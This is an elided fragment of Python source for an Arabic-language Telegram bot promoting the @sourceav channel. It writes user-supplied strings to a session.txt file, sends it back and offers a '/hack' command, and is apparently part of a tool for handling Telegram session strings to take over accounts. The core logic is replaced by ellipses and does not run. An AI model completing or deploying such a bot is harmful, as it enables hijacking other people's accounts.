...
'''
mm = '''
**- عليك الانضمـام في قنـاة السـورس اولاً**  @sourceav
'''
...
keyboard = [
  ...
  [
    Button.url("𝗭𝗧𝗵𝗼𝗻™ 𓅛", "https://t.me/sourceav")
    ]
]
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if len(i) > 1:
        ...
        file.write(i + "\n\n**- بواسطـة افاتار @sourceav**")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس افاتار ❤️** \n/hack", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس افاتار ❤️**", buttons=keyboard)
...
async def start(event):
    keyboard = [
      ...
      [
        Button.url("قنـاة السـورس", "https://t.me/sourceav")
        ]
    ]
